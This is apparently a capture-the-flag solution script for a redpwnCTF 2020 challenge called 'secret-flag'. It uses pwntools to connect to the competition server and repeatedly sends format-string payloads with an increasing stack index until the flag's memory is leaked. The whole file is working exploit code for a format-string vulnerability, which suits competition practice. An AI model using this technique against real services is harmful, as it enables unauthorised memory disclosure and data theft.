#!/usr/bin/env python3

from pwn import *

exe = ELF("./secret-flag")

context.binary = exe


def conn():
    return process([exe.path])


i = 3
def main():
	global i
	r = remote("2020.redpwnc.tf", 31826)


	r.recvline()
	r.recvline()
	payload = "%" + str(i) + "$s"
	payload = bytes(payload, 'utf-8')
	r.sendline(payload)
	i += 1
	r.interactive()
	r.close()

	#CTRL-C until having the flag
	#Apparenty the pointer to the flag content is in the stack so in few attemps we can leak the flag.


if __name__ == "__main__":
	while True:
		main()
